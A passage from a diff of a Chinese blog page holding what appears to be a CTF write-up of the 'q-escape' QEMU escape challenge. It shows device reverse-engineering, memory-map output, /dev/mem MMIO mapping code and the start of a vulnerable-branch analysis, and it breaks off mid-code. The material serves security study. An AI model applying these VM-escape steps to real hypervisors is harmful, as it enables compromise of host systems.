@@ -16,15 +16,23 @@
     
 <link rel="stylesheet" href="/css/style.css">
 
-    <link rel="shortcut icon" href="/images/ufo.ico">
-    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
-    <script id="hexo-configurations">
-    let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
-    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+    
+        <link rel="shortcut icon" href="/images/ufo.ico">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"浅浅更新博客一下吧~","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"慢慢好起来"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":true,"img_link":"/images/reward.jpg","text":"激励牛马，加速创作！","icon":"fa-solid fa-mug-hot"},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"😜若有问题请各位大师傅留言评论"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"feed":{"type":"atom","path":"atom.xml","limit":20},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
 </head>
 
 
@@ -36,67 +44,81 @@
 </div>
 
 
-<main class="page-container">
 
+<main class="page-container border-box">
+    <!-- home first screen  -->
     
 
-    <div class="page-main-content">
-
+    <!-- page content -->
+    <div class="page-main-content border-box">
         <div class="page-main-content-top">
-            <header class="header-wrapper">
-
-    <div class="header-content">
-        <div class="left">
             
-            <a class="logo-title" href="/">
-                196082&#39;s blog
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/ling.JPG">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               196082&#39;s blog
             </a>
         </div>
 
-        <div class="right">
-            <div class="pc">
-                <ul class="menu-list">
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
                                 首页
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
                                 归档
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                分类
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
                                 标签
+                                
                             </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -108,26 +130,54 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">首页</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">归档</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories">分类</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags">标签</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -140,93 +190,116 @@
 
         </div>
 
-        <div class="page-main-content-middle">
+        <div class="page-main-content-middle border-box">
 
-            <div class="main-content">
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        q-escape
+                    </div>
+                
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/ling.JPG">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">196082</span>
+                                
+                                    <span class="author-badge">慢慢好起来</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
 
-        <div class="article-title">
-            <span class="title-hover-animation">q-escape</span>
-        </div>
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
 
         
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ling.JPG">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2023-03-15 16:45:50
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/qemu-escape/">qemu escape</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/mmio/">mmio</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/pmio/">pmio</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/vga/">vga</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2023-03-15 16:45:50</span>
+            </span>
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>3.5k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>19 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Sat Mar 18 2023 14:32:16 GMT+0800">2023-03-18 14:32:16</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/qemu-escape/">qemu escape</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/mmio/">mmio</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pmio/">pmio</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/vga/">vga</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>3.5k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>19 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
     
 </div>
 
+                            </div>
+                        </div>
                     </div>
-                </div>
-            </div>
-        
+                
 
-        <div class="article-content markdown-body">
-            <p>许久没有更新，前段时间一直考试所以一直拖着了。</p>
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>许久没有更新，前段时间一直考试所以一直拖着了。</p>
 <h2 id="设备分析"><a href="#设备分析" class="headerlink" title="设备分析"></a>设备分析</h2><p>首先看看开了什么保护</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  q-escape checksec --file=./qemu-system-x86_64 </span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/Documents/pwn/qemu_escape/q-escape/qemu-system-x86_64&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
 
@@ -235,12 +308,7 @@
 
 <p>设备名为<code>cydf-vga</code>并且允许连接。</p>
 <p>将qemu-system-x86_64拖入ida中，查找与设备cydf-vga相关的函数。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230315122813653.png"
-                      alt="image-20230315122813653"
-                ></p>
+<p><img   src="/images/image-20230315122813653.png"  alt="image-20230315122813653"></p>
 <p>先分析cydf_vga_class_init初始化函数：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">cydf_vga_class_init</span><span class="params">(ObjectClass_0 *klass, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rbx</span></span><br><span class="line">  PCIDeviceClass *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           klass,</span><br><span class="line">                           <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;</span>,</span><br><span class="line">                           <span class="number">3223</span>,</span><br><span class="line">                           <span class="string">&quot;cydf_vga_class_init&quot;</span>);</span><br><span class="line">  v3 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           klass,</span><br><span class="line">                           <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;</span>,</span><br><span class="line">                           <span class="number">3224</span>,</span><br><span class="line">                           <span class="string">&quot;cydf_vga_class_init&quot;</span>);</span><br><span class="line">  v3-&gt;realize = pci_cydf_vga_realize;</span><br><span class="line">  v3-&gt;romfile = <span class="string">&quot;vgabios-cydf.bin&quot;</span>;</span><br><span class="line">  v3-&gt;vendor_id = <span class="number">0x1013</span>;</span><br><span class="line">  v3-&gt;device_id = <span class="number">0xB8</span>;</span><br><span class="line">  v3-&gt;class_id = <span class="number">0x300</span>;</span><br><span class="line">  v2-&gt;parent_class.desc = <span class="string">&quot;Cydf CLGD 54xx VGA&quot;</span>;</span><br><span class="line">  v2-&gt;parent_class.categories[<span class="number">0</span>] |= <span class="number">0x20</span>uLL;</span><br><span class="line">  v2-&gt;parent_class.vmsd = &amp;vmstate_pci_cydf_vga;</span><br><span class="line">  v2-&gt;parent_class.props = pci_vga_cydf_properties;</span><br><span class="line">  v2-&gt;parent_class.hotpluggable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -253,24 +321,14 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /sys/bus/pci/devices/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fa000000 0x00000000fbffffff 0x0000000000042208</span><br><span class="line">0x00000000febc1000 0x00000000febc1fff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x00000000febb0000 0x00000000febbffff 0x0000000000046200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
 
 <p>通过这里可以看到三个mmio空间。通过交叉引用，可以找到哪里注册了IO</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230315134309905.png"
-                      alt="image-20230315134309905"
-                ></p>
+<p><img   src="/images/image-20230315134309905.png"  alt="image-20230315134309905"></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memory_region_init_io(&amp;s-&gt;cydf_vga_io, owner, &amp;cydf_vga_io_ops, s, <span class="string">&quot;cydf-io&quot;</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">memory_region_init_io(&amp;s-&gt;low_mem, owner, &amp;cydf_vga_mem_ops, s, <span class="string">&quot;cydf-low-memory&quot;</span>, <span class="number">0x20000</span>uLL);</span><br><span class="line">memory_region_init_io(&amp;s-&gt;cydf_mmio_io, owner, &amp;cydf_mmio_io_ops, s, <span class="string">&quot;cydf-mmio&quot;</span>, <span class="number">0x1000</span>uLL);</span><br></pre></td></tr></table></figure>
 
 <p>这里关注与cydf相关的空间注册，根据大小来看第一个就是pmio，只不过在resource文件内没有范围</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/ioports </span></span><br><span class="line">0000-0cf7 : PCI Bus 0000:00</span><br><span class="line">  0000-001f : dma1</span><br><span class="line">  0020-0021 : pic1</span><br><span class="line">  0040-0043 : timer0</span><br><span class="line">  0050-0053 : timer1</span><br><span class="line">  0060-0060 : keyboard</span><br><span class="line">  0064-0064 : keyboard</span><br><span class="line">  0070-0071 : rtc0</span><br><span class="line">  0080-008f : dma page reg</span><br><span class="line">  00a0-00a1 : pic2</span><br><span class="line">  00c0-00df : dma2</span><br><span class="line">  00f0-00ff : fpu</span><br><span class="line">  0170-0177 : 0000:00:01.1</span><br><span class="line">    0170-0177 : ata_piix</span><br><span class="line">  01f0-01f7 : 0000:00:01.1</span><br><span class="line">    01f0-01f7 : ata_piix</span><br><span class="line">  0376-0376 : 0000:00:01.1</span><br><span class="line">    0376-0376 : ata_piix</span><br><span class="line">  03c0-03df : vga+</span><br><span class="line">  03f6-03f6 : 0000:00:01.1</span><br><span class="line">    03f6-03f6 : ata_piix</span><br><span class="line">  03f8-03ff : serial</span><br><span class="line">  0510-051b : QEMU0002:00</span><br><span class="line">  0600-063f : 0000:00:01.3</span><br><span class="line">    0600-0603 : ACPI PM1a_EVT_BLK</span><br><span class="line">    0604-0605 : ACPI PM1a_CNT_BLK</span><br><span class="line">    0608-060b : ACPI PM_TMR</span><br><span class="line">  0700-070f : 0000:00:01.3</span><br><span class="line">0cf8-0cff : PCI conf1</span><br><span class="line">0d00-ffff : PCI Bus 0000:00</span><br><span class="line">  afe0-afe3 : ACPI GPE0_BLK</span><br><span class="line">  c000-c03f : 0000:00:03.0</span><br><span class="line">  c040-c04f : 0000:00:01.1</span><br><span class="line">    c040-c04f : ata_piix</span><br></pre></td></tr></table></figure>
 
 <p>可以看到这里存在一个大小刚好为0x30的vga+的端口范围。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230315134724201.png"
-                      alt="image-20230315134724201"
-                ></p>
+<p><img   src="/images/image-20230315134724201.png"  alt="image-20230315134724201"></p>
 <p>根据定义的函数来看我们还需要找到vga的映射空间，通过这篇文章<a class="link"   target="_blank" rel="noopener" href="http://www.osdever.net/FreeVGA/vga/vgamem.htm" >vgamem<i class="fas fa-external-link-alt"></i></a>可以得知vga的映射空间为<code>000a0000-000bffff</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/iomem </span></span><br><span class="line">00000000-00000fff : Reserved</span><br><span class="line">00001000-0009fbff : System RAM</span><br><span class="line">0009fc00-0009ffff : Reserved</span><br><span class="line">000a0000-000bffff : PCI Bus 0000:00</span><br><span class="line">000c0000-000c97ff : Video ROM</span><br><span class="line">000c9800-000ca5ff : Adapter ROM</span><br><span class="line">000ca800-000cadff : Adapter ROM</span><br><span class="line">000f0000-000fffff : Reserved</span><br><span class="line">  000f0000-000fffff : System ROM</span><br><span class="line">00100000-03fdffff : System RAM</span><br><span class="line">  01000000-01c031d0 : Kernel code</span><br><span class="line">  01c031d1-0266a03f : Kernel data</span><br><span class="line">  028e2000-02b3dfff : Kernel bss</span><br><span class="line">03fe0000-03ffffff : Reserved</span><br><span class="line">04000000-febfffff : PCI Bus 0000:00</span><br><span class="line">  fa000000-fbffffff : 0000:00:04.0</span><br><span class="line">  fc000000-fcffffff : 0000:00:02.0</span><br><span class="line">  feb40000-feb7ffff : 0000:00:03.0</span><br><span class="line">  feb80000-feb9ffff : 0000:00:03.0</span><br><span class="line">  febb0000-febbffff : 0000:00:04.0</span><br><span class="line">  febc0000-febc0fff : 0000:00:02.0</span><br><span class="line">  febc1000-febc1fff : 0000:00:04.0</span><br><span class="line">fec00000-fec003ff : IOAPIC 0</span><br><span class="line">fed00000-fed003ff : HPET 0</span><br><span class="line">  fed00000-fed003ff : PNP0103:00</span><br><span class="line">fee00000-fee00fff : Local APIC</span><br><span class="line">fffc0000-ffffffff : Reserved</span><br><span class="line">100000000-17fffffff : PCI Bus 0000:00</span><br></pre></td></tr></table></figure>
 
@@ -282,12 +340,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">system( <span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span> );</span><br><span class="line"><span class="keyword">int</span> fd = open( <span class="string">&quot;/dev/mem&quot;</span>, O_RDWR | O_SYNC );</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mmio_mem = mmap( <span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0xfebc1000</span> );</span><br><span class="line"><span class="keyword">if</span> ( !mmio_mem ) &#123;</span><br><span class="line">    die(<span class="string">&quot;mmap mmio failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vga_mem = mmap( <span class="literal">NULL</span>, <span class="number">0x20000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0xa0000</span> );</span><br><span class="line"><span class="keyword">if</span> ( !vga_mem ) &#123;</span><br><span class="line">    die(<span class="string">&quot;mmap vga mem failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><p>根据上一道题的流程来看，这里需要分析分析结构体了。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230315135737136.png"
-                      alt="image-20230315135737136"
-                ></p>
+<p><img   src="/images/image-20230315135737136.png"  alt="image-20230315135737136"></p>
 <p>在对比两个结构体的结果发现了源文件中不存在<code>VulnState_0 vs[16];uint32_t latch[4];</code>这样两个属性。并且还明显的说了是<code>VulnState_0</code>。通过源码对比发现，源码中考虑地址的情况只有<code>addr &lt; 0x10000</code>，<code>addr &gt;= 0x18000 &amp;&amp; addr &lt; 0x18100</code></p>
 <p>但是这里存在一个新的，也就是大于<code>0x18100</code>的情况。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">v5 = opaque-&gt;vga.sr[<span class="number">0xCC</span>] % <span class="number">5u</span>;</span><br><span class="line"><span class="keyword">if</span> ( *(_WORD *)&amp;opaque-&gt;vga.sr[<span class="number">0xCD</span>] 